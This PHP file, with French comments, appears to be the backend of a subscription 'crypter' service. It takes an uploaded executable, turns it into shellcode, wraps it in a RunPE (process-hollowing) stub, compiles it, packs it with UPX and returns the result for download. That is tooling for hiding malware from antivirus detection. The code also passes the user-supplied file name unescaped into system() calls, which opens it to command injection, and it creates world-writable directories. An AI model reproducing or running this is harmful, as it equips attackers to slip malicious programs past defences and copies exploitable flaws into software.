<?php
require 'inc/base.php';

if (!isset($_SESSION['user_id'])) {
  header("Location: index.php");
  exit;
}

$query = $db->prepare("SELECT timestamp FROM users WHERE id=?");
$query->execute([$_SESSION['user_id']]);
$data = $query->fetch();

if (time() - $data->timestamp > 1296000) {
  header("Location: index.php");
  exit;
}

set_time_limit(0);

function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++)
	{
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

if(isset($_FILES['filexls']))
{
     $fichier = basename($_FILES['filexls']['name']);
	 $newname = generateRandomString();
	 $dossier = $newname . '/';

	 // créé le dossier
	 mkdir($newname, 777);
     if(move_uploaded_file($_FILES['filexls']['tmp_name'], $dossier . $fichier)) //Si la fonction renvoie TRUE, c'est que ça a fonctionné...
     {
          echo 'Upload effectué avec succès !';
     }
     else //Sinon (la fonction renvoie FALSE).
     {
          echo 'Echec de l\'upload !';
		  rmdir($newname . "/");
     }
	 // renome le fichier à crypter
	 rename ( $newname . "/" . $_FILES['filexls']['name'], $newname . "/" . $newname . ".exe");
	 // copie le runPE
	 copy("crypter/WhAkDM2s.h", $newname . "/WhAkDM2s.h");
	 //compile le shellcode.h
	 system("crypter\\generator_h.exe " . $newname . "\\" . $newname . ".exe \"" . $newname . ".h\"");
	 while (!file_exists("./" . $newname . ".h"))
	 {
	 }
	 // déplace le shellcode dans le bon répertoire
	 rename ($newname . ".h", $newname . "/" . $newname . ".h");
	 //compile le stub.cpp
	 system("crypter\\generator_cpp.exe \"" . $newname . ".h\" \"" . $newname . ".cpp\"");
	 while (!file_exists("./" . $newname . ".cpp"))
	 {
	 }
	 // déplace le shellcode dans le bon répertoire
	 rename ($newname . ".cpp", $newname . "/" . $newname . ".cpp");
	 // delete le fichier uploadé
	 unlink($newname . "/" . $newname . ".exe");
	 // compile le stub final
	 system("MinGW\\bin\\mingw32-g++.exe -o " . $newname . ".exe " . $newname . "\\" . $newname . ".cpp");
	 while (!file_exists("./" . $newname . ".exe"))
	 {
	 }
	 // delete le runPE.h
	 unlink($newname . "/WhAkDM2s.h");
	 // delete le fichier.h
	 unlink($newname . "/" . $newname . ".h");
	 // delete le stub.cpp
	 unlink($newname . "/" . $newname . ".cpp");
	 // déplace le stub
	 rename ($newname . ".exe", $newname . "/" . $newname . ".exe");
	 // compression UPX
	 system("crypter\\upx.exe -9 " . $newname . "\\" . $newname . ".exe");
	 // redirige vers le dl
	 header("Location: ". $newname . "/" . $newname . ".exe");
	 exit();
}
?>
